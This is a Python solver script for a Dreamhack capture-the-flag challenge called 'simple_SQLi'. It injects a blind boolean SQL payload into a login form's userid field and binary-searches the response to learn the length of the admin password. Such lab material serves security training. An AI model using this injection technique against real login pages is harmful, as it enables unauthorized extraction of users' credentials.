import requests
import sys
from urllib.parse import urljoin
class Solver:
    """Solver for simple_SQLi challenge"""
    # initialization
    def __init__(self, port: str) -> None:
        self._chall_url = f"http://host3.dreamhack.games:{port}"
        self._login_url = urljoin(self._chall_url, "login")
    # base HTTP methods
    def _login(self, userid: str, userpassword: str) -> bool:
        login_data = {
            "userid": userid,
            "userpassword": userpassword
        }
        resp = requests.post(self._login_url, data=login_data)
        return resp
    # base sqli methods
    def _sqli(self, query: str) -> requests.Response:
        resp = self._login(f"\" or {query}-- ", "hi")
        return resp
    def _sqli_lt_binsearch(self, query_tmpl: str, low: int, high: int) -> int:
        while 1:
            mid = (low+high) // 2
            if low+1 >= high:
                break
            query = query_tmpl.format(val=mid)
            if "hello" in self._sqli(query).text:
                high = mid
            else:
                low = mid
        return mid
    # attack methods
    def _find_password_length(self, user: str, max_pw_len: int = 100) -> int:
        query_tmpl = f"((SELECT LENGTH(userpassword) WHERE userid=\"{user}\")<{{val}})"
        pw_len = self._sqli_lt_binsearch(query_tmpl, 0, max_pw_len)
        return pw_len
    def solve(self):
        pw_len = solver._find_password_length("admin")
        print(f"Length of admin password is: {pw_len}")
if __name__ == "__main__":
    port = sys.argv[1]
    solver = Solver(port)
    solver.solve()